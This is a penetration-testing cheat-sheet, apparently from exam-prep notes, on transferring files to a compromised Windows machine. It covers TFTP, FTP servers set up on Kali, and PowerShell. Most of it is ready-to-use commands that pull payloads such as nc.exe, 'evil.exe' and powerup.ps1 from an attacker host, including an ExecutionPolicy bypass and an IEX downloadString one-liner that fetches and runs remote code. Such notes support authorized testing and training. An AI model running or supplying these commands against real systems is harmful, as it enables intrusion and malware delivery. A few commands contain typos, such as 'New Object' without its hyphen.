# Window File Transfer



## TFTP

* Windows XP and Win 2003 contain tftp client. Windows 7 do not by default
* tfpt clients are usually non-interactive, so they could work through an obtained shell

atftpd --daemon --port 69 /tftp Windows&gt; tftp -i 192.168.30.45 GET nc.exe

## FTP \(pyftpdlib client on Kali\)

* Ftp is generally installed on Windows machines
* To make it interactive, use -s option

### On Kali install a ftp client and set a username/password

```text
apt-get install python-pyftpdlib  
python -m pyftpdlib -p 21
```

### on Windows

```text
ftp <attackerip>
> binary
> get exploit.exe
```

## FTP \(pureftpd client on Kali\)

### on Kali

#### install ftp client

```text
apt-get install pure-ftpd
```

#### create a group

```text
groupadd ftpgroup
```

#### add a user

```text
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
```

#### Create a directory for your ftp-files \(you can also specify a specific user e.g.: /root/ftphome/bob\).

```text
mkdir /root/ftphome
```

#### Create a ftp-user, in our example "bob" \(again you can set "-d /root/ftphome/bob/" if you wish\).

```text
pure-pw useradd bob -u ftpuser -g ftpgroup -d /root/ftphome/
```

#### Update the ftp database after adding our new user.

```text
pure-pw mkdb
```

#### change ownership of the specified ftp directory \(and all it's sub-direcotries\)

```text
chown -R ftpuser:ftpgroup /root/ftphome
```

#### restart Pure-FTPD

```text
/etc/init.d/pure-ftpd restart
```

#### On Windows

```text
echo open <attackerip> 21> ftp.txt
echo USER username password >> ftp.txt
echo bin >> ftp.txt
echo GET evil.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

## Powershell

```text
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://<attackerip>/powerup.ps1" >>wget.ps1
echo $file = "powerup.ps1" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

### Powershell download a file

```text
powershell "IEX(New Object Net.WebClient).downloadString('http://<targetip>/file.ps1')"
```

